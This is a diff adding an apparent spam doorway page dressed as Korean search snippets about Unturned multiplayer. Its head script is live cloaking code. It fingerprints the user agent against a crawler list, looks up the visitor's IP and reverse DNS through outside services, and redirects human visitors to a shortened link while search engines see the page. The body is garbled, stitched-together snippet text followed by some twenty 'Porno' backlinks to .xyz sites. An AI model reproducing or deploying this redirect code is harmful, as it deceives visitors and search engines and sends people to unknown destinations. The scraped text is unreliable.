@@ -1,0 +1,75 @@
+
+<html>
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-CE934VD9JW"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-CE934VD9JW');
+</script>
+
+	
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
+<script>
+function isCrawler() {
+	var botPattern = "(googlebot\/|Googlebot-Mobile|Googlebot-Image|Google favicon|Mediapartners-Google|bingbot|slurp|java|wget|curl|Commons-HttpClient|Python-urllib|libwww|httpunit|nutch|phpcrawl|msnbot|jyxobot|FAST-WebCrawler|FAST Enterprise Crawler|biglotron|teoma|convera|seekbot|gigablast|exabot|ngbot|ia_archiver|GingerCrawler|webmon |httrack|webcrawler|grub.org|UsineNouvelleCrawler|antibot|netresearchserver|speedy|fluffy|bibnum.bnf|findlink|msrbot|panscient|yacybot|AISearchBot|IOI|ips-agent|tagoobot|MJ12bot|dotbot|woriobot|yanga|buzzbot|mlbot|yandexbot|purebot|Linguee Bot|Voyager|CyberPatrol|voilabot|baiduspider|citeseerxbot|spbot|twengabot|postrank|turnitinbot|scribdbot|page2rss|sitebot|linkdex|Adidxbot|blekkobot|ezooms|dotbot|Mail.RU_Bot|discobot|heritrix|findthatfile|europarchive.org|NerdByNature.Bot|sistrix crawler|ahrefsbot|Aboundex|domaincrawler|wbsearchbot|summify|ccbot|edisterbot|seznambot|ec2linkfinder|gslfbot|aihitbot|intelium_bot|facebookexternalhit|yeti|RetrevoPageAnalyzer|lb-spider|sogou|lssbot|careerbot|wotbox|wocbot|ichiro|DuckDuckBot|lssrocketcrawler|drupact|webcompanycrawler|acoonbot|openindexspider|gnam gnam spider|web-archive-net.com.bot|backlinkcrawler|coccoc|integromedb|content crawler spider|toplistbot|seokicks-robot|it2media-domain-crawler|ip-web-crawler.com|siteexplorer.info|elisabot|proximic|changedetection|blexbot|arabot|WeSEE:Search|niki-bot|CrystalSemanticsBot|rogerbot|360Spider|psbot|InterfaxScanBot|Lipperhey SEO Service|CC Metadata Scaper|g00g1e.net|GrapeshotCrawler|urlappendbot|brainobot|fr-crawler|binlar|SimpleCrawler|Livelapbot|Twitterbot|cXensebot|smtbot|bnf.fr_bot|A6-Indexer|ADmantX|Facebot|Twitterbot|OrangeBot|memorybot|AdvBot|MegaIndex|SemanticScholarBot|ltx71|nerdybot|xovibot|BUbiNG|Qwantify|archive.org_bot|Applebot|TweetmemeBot|crawler4j|findxbot|SemrushBot|yoozBot|lipperhey|y!j-asr|Domain Re-Animator Bot|AddThis)";
+	var re = new RegExp(botPattern, 'i');
+	var userAgent = navigator.userAgent;
+	if (re.test(userAgent)) {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+function get_ip() {
+	var value = $.ajax({
+		url: 'https://api.ipify.org/?format=json',
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+function gethostbyname() {
+	var value = $.ajax({
+		url: "https://get.geojs.io/v1/dns/ptr.json",
+		async: false
+	}).responseJSON;
+	return value;
+}
+
+var real_ip = get_ip().ip;
+var hostname = gethostbyname().ptr;
+
+
+function is_google() {
+	if (hostname.indexOf(".google.com") != '-1' || hostname.indexOf(".googlebot.com") != '-1') {
+		return true;
+	} else {
+		return false;
+	}
+}
+
+//search zone start//
+if (is_google() == false) {
+	if (document.referrer) {
+		if (isCrawler() != true && is_google() != true) {
+            window.location="https://t.co/8yIHdLe9bL"; 
+
+		}
+	}
+}
+//search zone finish//
+</script>
+<title>13398</title>
+</script>
+</head>
+<body>
+<h1>언턴드 친구랑 멀티</h1>
+<p>Aug 4, 2014 — 친구랑할땐 pvp가좋겠지만 다른사람이랑 할땐 pve랑하는게 좋습니다. 난이도는 이지가 좋아요 난이도밑에는 저장인거같습니다. 패스워드는 않칠수도있고 ...Jul 12, 2014 — 정말 간단합니다. Password 부분에 서버 만드실때 설정하셨던 Password 알려주시면 되구요. IP는 서버 만든사람의 IP를 적어야합니다. 네이버에 [내 ...Feb 7, 2021 — 친구들과 놀기 위해 서버 만드시는 분들께 홧팅!!! ​. 만약 워크샵을 서버에 적용하고 싶으면. steamlibrarysteamappsworkshop304930 에서 자신이 ...하마치:언턴드하마치서버1,언턴드하마치서버2,언턴드하마치서버3,언턴드하마치서버4,언턴드하마치서버5,언턴드하마치서버6,언턴드하마치서버7,언턴드하마치서버8, ...Aug 9, 2017 — 친구와 같이 하는 경우 친구에게 그 네트워크명과 비밀번호를 알려주면 되는데요. 호스트인 경우에는 play 에 들어 간 다음 Host 버튼을 눌러서 들어가면 ...Dec 8, 2020 — 스팀에서 초대하거나 못함? - dc official App.Apr 17, 2021 — 이거 따라서 만들었는데 스팀 서버창에서 랜에 멀티 서버 열려있고 언턴드 게임 내부 인터넷 서버 리스트에 안뜨면 포트 27015:27016 으로 포트포워딩 ...Nov 17, 2015 — 요 며칠간 언턴드에 빠져서 싱글, 멀티할 것 없이 밤을 새가면서 플레이해본 결과. 오래동안 잡고 있을 게임은 아니다. 라는 결론이 나왔습니다.Oct 22, 2022 — 언턴드의 멀티플레이에선 사람들과 소통을 할 수 있어 잘 지루해지지 않으며, 몇몇 서버는 기존의 서바이벌 대신 데스매치, RP 등의 컨텐츠를 제공 ...Aug 28, 2015 — 친구한테 서버 IP하고 포트하고 비밀번호 달라고 하세요. 뭐... IP 보는 법을 모른다구요? 윈도우키 + R 누르시면 실행창 나옵니다. 그리고 cmd 를 ...언턴드 멀티 · 언턴드 서버 여는 방법 Steam CMD X 포트포워딩 X · 최신 언턴드 서버 초간단 구동기 배포 서버를 열어보자 · 새롭게 바뀐 언턴드 서버여는법 SteamCMD · 그래픽 ...Oct 2, 2017 — 이번시간에 알려드릴 것은 언턴드의 서버 여는 법으로 3.0부터 개정이 된것이라고도 볼 수 있고,가장 일반적이고, 대중적이며 따라하기 쉬운 방법임을 ...Oct 12, 2022 — 포스트 아포칼립스적인 세계인 언턴드에 빠져 모두를 좀비로 만든 바이러스에 ... 하이 옥탄 드리프트는 멀티플레이어 게임이므로 친구와 경쟁하거나 ...7 hours ago — 오늘은 마인크래프트 자바 에디션에서 친구와 멀티플레이하는 방법을 알려 ... 멀티플레이 서버 언턴드(Unturned) 국민트리언턴드(Unturned)의 다양한 ...15 hours ago — 초간단 하마치 서버 열어서 친구랑 같이 게임하는 방법 마인크래프트 서버 ... 하마치 서버 를 여시려면 하마치 …peste 2 zile — 언턴드 멀티 플레이 ...5 days ago — unturned(언턴드) 공략 - 싱글을해보자 - 히드빈의 블로그 언턴드 친구랑 멀티 - المبدعون العرب 언턴드 아이템 코드 - Meem 서버 언턴드 지도 획득 ...친구랑 같이 하기 좋은 스팀 코옵 게임 50가지 추천 (2인, 4인 등등) 2020. ... 그래픽을 가지고 있고, 아직까지도 많은 사람들이 플레이하는 언턴드 라는 게임입니다.7 hours ago — 스팀 생존멀티 게임 추천. … (2021년) – 겜돌이 [게임추천] 친구랑 함께하는 스팀 멀티 코옵 협동 생존게임추천!ㅜㅜ앞으로도 재밌는 코옵게임 많이 나 ...13 hours ago — 친구랑 같이 하기 좋은 스팀 코옵 게임 50가지 추천 (2인, 4인 등등) 2020. 1 11. ... 아직까지도 많은 사람들이 플레이하는 언턴드 라는 게임입니다.13 hours ago — 한 래프트라는 게임은 친구들과 진행할 수 있는 멀티플레이 생존 게임이 … ... 친구랑 할만한 게임 다 여기있다 언턴드 Unturned (무료) · 4 서바이벌 ...7 hours ago — 친구랑 할만한 게임 다 여기있다 [GAME] 최고의 생존 게임 20가지 – PC Xbox ... 2022 멀티 게임 추천 좀비 생존 협동게임 초기대작 TOP8 (넌 언턴드 ...6 hours ago — 기차 선로 놓기 게임 언레일드 #스팀게임 #멀티게임 #멀티플레이어 #게임추천 #언레일 ... 2021 — 친구랑 할 멀티게임 추천 #멀티 #협동 #코옵 · 1.18 hours ago — 항상 친구들과 경쟁하고 mcpe boat battlers pvp 맵에서 배에서 누가 더 ... 2 zile — 마인크래프트 멀티플레이 서버 언턴드(Unturned) 국민트리언 …7 hours ago — 무료게임인데도 불구하고 멀티로 친구와 게임을 즐길 수 있는 크라이 오브 … ... 11가지 – 101 Help 스팀 무료게임 추천 언턴드 Unturned 생존형 …17 hours ago — 18:08.acum 24 de ore — 마인 크래프트 친구 랑 같이 하기 30 mai 2021. 마인크래프트 로컬 멀티플레이 하는 방법 – 자바에디션 – 로컬 네트워크에서 ...<a href="https://soktumun.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fremon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freejon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://memcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dilaracuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dudikli.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://haruncuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freefon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://duraman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeeon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://fittirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://furtuni.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://supersan.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://saklaman.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freeron.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freecon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://yuppik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://freenon.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://sirikim.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://cemcuk.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a><a href="https://dandirik.xyz" title="Porno" rel="dofollow noopener" target="_blank">Porno</a></p>
+</body>
+</html>
+    
